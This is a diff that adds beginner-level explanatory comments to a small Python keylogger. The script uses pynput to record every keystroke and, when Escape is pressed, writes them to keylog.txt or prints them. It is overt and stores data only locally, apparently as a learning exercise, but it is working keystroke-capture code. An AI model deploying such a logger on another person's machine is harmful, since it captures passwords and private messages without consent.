@@ -1,30 +1,30 @@
 #pynput must be install in the terminal before usage. "pip install pynput"
 
 import sys
-import pynput
-from pynput import keyboard
+import pynput 
+from pynput import keyboard 
 
-keysPressed = []
+keysPressed = [] #the list of keys being pressed, empty currently, but will be filled as script goes on
 
 def pushedDown(key):
-    if key == keyboard.Key.esc:
-        print("Keylogger off")
+    if key == keyboard.Key.esc: #if they key pushed is escape...
+        print("Keylogger off") 
         question = input("Would you like to export [E] this to a .txt file or print [P] to console?: ")
         if question == "e" or question == "E":
-            with open("keylog.txt", "w") as file:
-                file.write("Keys pressed: " + str(keysPressed))
-            sys.exit()
+            with open("keylog.txt", "w") as file: #this is like saying "file = open("keylog.txt", "w") but in a more compact version."
+                file.write("Keys pressed: " + str(keysPressed)) #write to the file the end result. also, with will use this single block and it acts as a single use variable, that will not be used after the block is done.
+            sys.exit() #then, close the program
         elif question == "p" or question == "P":
-            print("Keys pressed:", keysPressed)
+            print("Keys pressed:", keysPressed) #this will do the same as e, but print the result in the console
             sys.exit()
         else:
-            print("Invalid")
+            print("Invalid") #anything else, just close the script
             sys.exit()
-    else:
-        try:
-            keysPressed.append(key.char)
-        except AttributeError:
-            keysPressed.append(f"[{key}]")
+    else: #any other key that isnt escape....
+        try: #try adding it to the list mentioned in line 7
+            keysPressed.append(key.char) #and if it works, it will be added. append is like +=, but for lists.
+        except AttributeError: #except, if a special key is pressed....
+            keysPressed.append(f"[{key}]") #then add it to the list, but make it easier to read. It used to be <space.key>, but now its [space.key]
 
-with keyboard.Listener(on_press=pushedDown) as keyListener:
-    keyListener.join()
+with keyboard.Listener(on_press=pushedDown) as keyListener: #keyListener = keyboard.Listener(when any key is pressed on the keyboard, do the function (pushedDown))
+    keyListener.join() #this connects the listener to the computer
